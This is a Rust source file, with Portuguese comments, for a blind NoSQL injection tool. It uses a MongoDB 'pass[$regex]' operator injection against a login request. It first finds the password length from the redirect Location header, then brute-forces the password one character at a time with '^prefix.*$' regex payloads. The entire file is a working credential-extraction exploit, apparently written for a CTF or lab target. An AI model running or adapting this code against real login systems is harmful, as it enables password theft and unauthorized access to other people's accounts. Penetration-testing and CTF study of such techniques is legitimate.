use crate::config::Settings;
use crate::http::execute_request;
use colored::*;
use regex::Regex;
use std::error::Error;

pub fn checking_password_length(settings: &mut Settings) -> Result<usize, Box<dyn Error>> {
    // Descobrir o tamanho da senha primeiro
    println!(
        "{}",
        "\n 🔎 Descobrindo o tamanho da senha...\n".blue().bold()
    );
    let mut password_length = 0;
    let original_payload = settings.payload.data.clone();

    // Expressão regular para capturar qualquer número dentro de "^.{NUMERO}$"
    let re = Regex::new(r"\^\.\{(\d+)\}\$").unwrap();

    for length in 1..35 {
        // Testando tamanhos de 1 a 35 caracteres
        println!("{}{}", "Testando tamanho: ".cyan(), length);

        // Criando a nova string corretamente com interpolação
        let replacement = format!("^.{{{}}}$", length);
        let new_payload = re
            .replace(&original_payload, replacement.as_str())
            .to_string();
        settings.payload.data = new_payload;

        let response = execute_request(&settings)?;

        if let Some(location) = response.headers().get("location") {
            if location.to_str().unwrap_or("") == settings.response.success {
                password_length = length;
                println!(
                    "Tamanho da senha encontrado: {} caracteres",
                    password_length
                );
                break;
            }
        }
    }

    // Restaurar o payload original
    settings.payload.data = original_payload;

    if password_length == 0 {
        return Err("Não foi possível determinar o tamanho da senha".into());
    }

    Ok(password_length)
}

pub fn finding_each_character(
    settings: &mut Settings,
    password_length: usize,
) -> Result<String, Box<dyn Error>> {
    // Caracteres possíveis (letras minúsculas, maiúsculas e números)
    let charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    // String para armazenar a senha
    let mut password = String::new();
    println!(
        "{}{}{}",
        "\n🔐 Iniciando brute force da senha de ".purple().bold(),
        password_length,
        " caracteres...".purple().bold(),
    );

    // Salvar o payload original
    let original_payload = settings.payload.data.clone();
    // Expressão regular para substituir a parte regex no payload
    let _re = Regex::new(r"\^\.\{(\d+)\}\$").unwrap();

    // Descobrir cada caractere da senha
    for position in 0..password_length {
        println!(
            "{}{}{}",
            "\n🔑 Testando posição ".cyan().bold(),
            position + 1,
            " ...".cyan().bold()
        );
        let mut found = false;

        for c in charset.chars() {
            // Construir regex para testar o caractere atual
            let regex_pattern = format!("^{}{}.*$", password, c);

            println!("Tentando regex: {}", regex_pattern);
            let new_payload = original_payload.replace(
                &format!("pass[$regex]=^.{{{}}}$", password_length),
                &format!("pass[$regex]={}", regex_pattern),
            );

            settings.payload.data = new_payload;

            let response = execute_request(&settings)?;
            let status = response.status();

            // Debugging para entender melhor as respostas
            println!("🔄 Testando {} -> Status: {}", c, status);

            if let Some(location) = response.headers().get("location") {
                if location.to_str().unwrap_or("") == settings.response.success {
                    password.push(c);
                    println!(
                        "✅ Caractere encontrado: {} | Senha até agora: {}",
                        c, password
                    );
                    found = true;
                    break;
                }
            }
        }

        if !found {
            return Err(format!(
                "Não foi possível encontrar o caractere na posição {}",
                position + 1
            )
            .into());
        }
    }

    // Restaurar o payload original
    settings.payload.data = original_payload;

    Ok(password)
}
